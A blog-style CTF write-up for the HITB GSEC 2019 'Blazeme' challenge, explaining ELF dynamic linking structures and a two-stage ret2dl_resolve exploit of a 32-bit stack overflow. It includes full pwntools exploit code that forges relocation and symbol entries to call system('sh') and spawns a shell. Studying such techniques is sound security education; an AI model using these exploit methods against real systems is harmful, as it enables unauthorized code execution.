---
layout: post
title: Hack in The Box Gsec CTF 2019 - Blazeme
date: 2019-12-04 00:00:00
categories: 
    - ctf
tags:
    - ctf
    - linux
    - x86
    - stack buffer overflow
    - ret2dl_resolve
    - binary exploitation
---

### Sources

[https://github.com/fachrioktavian/ctf-writeup/tree/master/hitbgsec19/blazeme](https://github.com/fachrioktavian/ctf-writeup/tree/master/hitbgsec19/blazeme)

### Summary

I've got this challenge from friend who joined the hitbgsec ctf in Singapore last year. This challenge refreshes my memory about a technique called ret2dl_resolve. It's a technique like ret2libc, but because the limitation of libc function in the binary so we return the binary using lazy binding mechanism of `_dl_resolve()` function.

#### Overview

The binary is a simple binary, it reads input exits. Nothing fancy, no funtion to read flag or libc's system function.

```c
int __cdecl main()
{
  char buf;
  read(0, &buf, 200u);
  return 0;
}
```

Binary's protection:

```terminal
❯ checksec blazeme
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

#### The bugs

From the Overview section above we should now that it's a stack buffer overflow. Dynamic binary, No canary and NX protection found, so basically we will solve this challenge using ret2libc. But again there isn't any function that useful to leak libc address.

#### Exploitation's scenario

1. Because we can't leak anything, first we should defeat ASLR by read our payload to BSS segment and jump to it. Thank god no PIE enable.

2. Calling `_dl_resolve()` to resolves and calls `system("sh")`.

### Exploitation

#### Helper

Some variable that we need in the exploitation process, will talk about it in the Stage 2's section.

```python
r = process("./blazeme", aslr=1)

read_plt = 0x080482f0
tmp_got = 0x0804a000

ELF_JMPREL_Rel_Tab = 0x08048298
ELF_String_Tab = 0x0804821C
ELF_Symbol_Tab = 0x080481CC

leave_ret_gdt = 0x08048388
bss_segment = 0x0804af00
_dl_resolve = 0x080482e0

pad = "A"*108
```

#### Stage 1. Reads stage2 payload and jump to it, defeat ASLR

Using ret2libc we craft payload to read stage2 payload and jump to it using `leave; ret;` gadget.

```python
stage1 = flat(pad, p32(bss_segment), p32(read_plt), p32(leave_ret_gdt), p32(0), p32(bss_segment), p32(0x80))

r.send(stage1)
```

Binary then will reads our next input and stores it on BSS segment.

#### Stage 2. Return to _dl_resolve()

##### Elf relocation

We know that for a dynamic binary, when it calls a libc function (e.g `read`) for the first time, the Linker (we know as `LD`) will search it in the libc then executes the function. After that the address of `read` will placed in GOT segment and can be use for the next function call.

##### Dynamic section

In the ELF binary there is a dynamic section that's used for LD to resolve symbols at runtime.

```terminal
❯ readelf -d blazeme 
Dynamic section at offset 0xf14 contains 24 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     0x1
 0x0000000c (INIT)                       0x80482b0
 0x0000000d (FINI)                       0x80484c4
 0x00000019 (INIT_ARRAY)                 0x8049f08
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x8049f0c
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x80481ac
 0x00000005 (STRTAB)                     0x804821c
 0x00000006 (SYMTAB)                     0x80481cc
 0x0000000a (STRSZ)                      74 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x804a000
 0x00000002 (PLTRELSZ)                   24 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x8048298
 0x00000011 (REL)                        0x8048290
 0x00000012 (RELSZ)                      8 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x8048270
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x8048266
 0x00000000 (NULL)                       0x0
```

For exploitation, we will focus on `STRTAB` (ELF String Table), `SYMTAB` (ELF Symbol Table), and `JMPREL` (ELF Relocation Table).

##### JMPREL

JMPREL segment ('PLT' Relocation section) stores a table called `relocation table`. Each entry maps to a symbol and the size of each entry is 8 bytes.

```terminal
❯ readelf --use-dynamic -r blazeme
'REL' relocation section at offset 0x8048290 contains 8 bytes:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ffc  00000206 R_386_GLOB_DAT    00000000   <string table index:  49>

'PLT' relocation section at offset 0x8048298 contains 24 bytes:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   <string table index:  26>
0804a010  00000207 R_386_JUMP_SLOT   00000000   <string table index:  49>
0804a014  00000307 R_386_JUMP_SLOT   00000000   <string table index:  31>
```

```asm
# disasm of blazeme
LOAD:08048298 ; ELF JMPREL Relocation Table
LOAD:08048298                 Elf32_Rel <804A00Ch, 107h> ; R_386_JMP_SLOT read
LOAD:080482A0                 Elf32_Rel <804A010h, 207h> ; R_386_JMP_SLOT __gmon_start__
LOAD:080482A8                 Elf32_Rel <804A014h, 307h> ; R_386_JMP_SLOT __libc_start_main
```

The entries' struct type is `Elf32_Rel` which define in macros:

```c
typedef uint32_t Elf32_Addr ;
typedef uint32_t Elf32_Word ;
typedef struct
{
   Elf32_Addr r_offset ; /* Address */
   Elf32_Word r_info ; /* Relocation type and symbol index */
} Elf32_Rel ;
#define ELF32_R_SYM(val) ((val) >> 8)
#define ELF32_R_TYPE(val) ((val) & 0xff)
```

If we take a look on first entry of PLT relocation section there is symbol `read`:

- `Offset` or `r_offset` saves GOT address of `read` 0x0804a00c

- `Info` or `r_info` stores the metadata of `ELF32_R_SYM` and `ELF32_R_TYPE`. `r_info` 0x107,from defined macros we know that `ELF32_R_SYM` is 1 ((val) >> 8) and `ELF32_R_TYPE` is 7 ((val) & 0xff)

##### SYMTAB

SYMTAB segments(ELF Symbol Table) stores relevant symbols information. The type of each entry is `ELF32_Sym` struct and the size is 16 bytes. The type is define as:

```c
typedef struct
{
   Elf32_Word st_name ; /* Symbol name (string tbl index) */
   Elf32_Addr st_value ; /* Symbol value */
   Elf32_Word st_size ; /* Symbol size */
   unsigned char st_info ; /* Symbol type and binding */
   unsigned char st_other ; /* Symbol visibility under glibc>=2.2 */
   Elf32_Section st_shndx ; /* Section index */
} Elf32_Sym ;
```

```gdb
pwndbg> x/4wx 0x080481DC
0x80481dc:	0x0000001a	0x00000000	0x00000000	0x00000012
```

The first value `st_name` holds the offset of name of the symbols starts in `STRTAB`.

##### STRTAB

STRTAB segments(ELF String Table) is a table that stores strings of symbols name.

```asm
LOAD:0804821C ; ELF String Table
LOAD:0804821C byte_804821C    db 0
LOAD:0804821C
LOAD:0804821D aLibcSo6        db 'libc.so.6',0
LOAD:08048227 aIoStdinUsed    db '_IO_stdin_used',0
LOAD:08048236 aRead           db 'read',0
LOAD:0804823B aLibcStartMain  db '__libc_start_main',0
LOAD:0804823B
LOAD:0804824D aGmonStart      db '__gmon_start__',0
LOAD:0804825C aGlibc20        db 'GLIBC_2.0',0
```

If we look at JMPREL section, ELF32_R_SYM of `read` is 1 and st_name is 0x1a. This information is used to get value in STRTAB.

```gdb
pwndbg> x/s 0x0804821C + (1*0x1a)
0x8048236:	"read"
```

##### _dl_runtime_resolve()

When resolver runs, it calls _dl_runtime_resolve(link_map, rel_offset). The rel_offset gives offset of the `Elf32_Rel` struct in JMPREL table. `link_map` gives address of list with all loaded libraries. _dl_runtime_resolve() will use that address to stores resolved read function from libc. So basically it's just need a writable address. The pseudocode that describes what _dl_runtime_resolve() does is:

```c
// call of unresolved read(0, buf, 0x100)
_dl_runtime_resolve(link_map, rel_offset) {
    Elf32_Rel * rel_entry = JMPREL + rel_offset ;
    Elf32_Sym * sym_entry = &SYMTAB [ ELF32_R_SYM ( rel_entry -> r_info )];
    char * sym_name = STRTAB + sym_entry -> st_name ;
    _search_for_symbol_(link_map, sym_name);
    // invoke initial read call now that symbol is resolved
    read(0, buf, 0x100);
}
```

##### Building payload

With knowing concept of JMPREL, SYMTAB, STRTAB, and how _dl_runtime_resolve() works, then we can craft a payload that ask binary to call _dl_runtime_resolve to resolves symbol system then calls `system('sh')` for us.

First calculate the address off `Elf32_Rel` structure of system's symbols that we create in stage2 as `0x08048298` is address of the top table of JMPREL.

```python
crafted_area = bss_segment + 0x14
elf32_Rel_offset = crafted_area - ELF_JMPREL_Rel_Tab
```

Then calculate `elf32_Sym_offset` and `elf32_Sym_index` as `0x080481CC` is the address  of top address of SYMTAB.

```python
elf32_Sym_offset = crafted_area + 0x8
align = 0x10 - ((elf32_Sym_offset - ELF_Symbol_Tab) % 0x10)
elf32_Sym_offset += align
elf32_Sym_index = (elf32_Sym_offset - ELF_Symbol_Tab) / 0x10
```

Next, calculate `elf32_Sym_st_name` value so _dl_runtime_resolve can find our "system" string.

```python
elf32_Rel_r_info = (elf32_Sym_index << 8) | 0x7

elf32_Rel_data = flat(p32(tmp_got), p32(elf32_Rel_r_info))

elf32_Sym_st_name = (elf32_Sym_offset + 0x10) - ELF_String_Tab
elf32_Sym_data = flat(p32(elf32_Sym_st_name), p32(0), p32(0), p32(0x12))
```

Finally craft all stage 2 payload:

```python
system_param_offset = bss_segment + 0x64
system_str = "system\x00"
system_param_str = "sh\x00"
stage2 = flat(
    "JUNK", 
    p32(_dl_resolve), 
    p32(elf32_Rel_offset), 
    "JUNK", 
    p32(system_param_offset), 
    elf32_Rel_data, 
    "A"*align, 
    elf32_Sym_data, 
    system_str)
pad = "B" * (100 - len(stage2))
stage2 += flat(
    pad, 
    system_param_str)
pad = "C" * (0x80 - len(stage2))
stage2 += flat(pad)

r.send(stage2)
```

#### Pwned

```terminal
❯ python solve2.py
[+] Starting local process './blazeme': pid 6768
[*] Stage 1 > Read stage2 payload and jump to stage2
[*] Stage 2 > Ret2dl_resolve
[+] Pwned!
[*] Switching to interactive mode
$ uname -a
Linux fokt 5.0.0-31-generic #33~18.04.1-Ubuntu SMP Tue Oct 1 10:20:39 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```
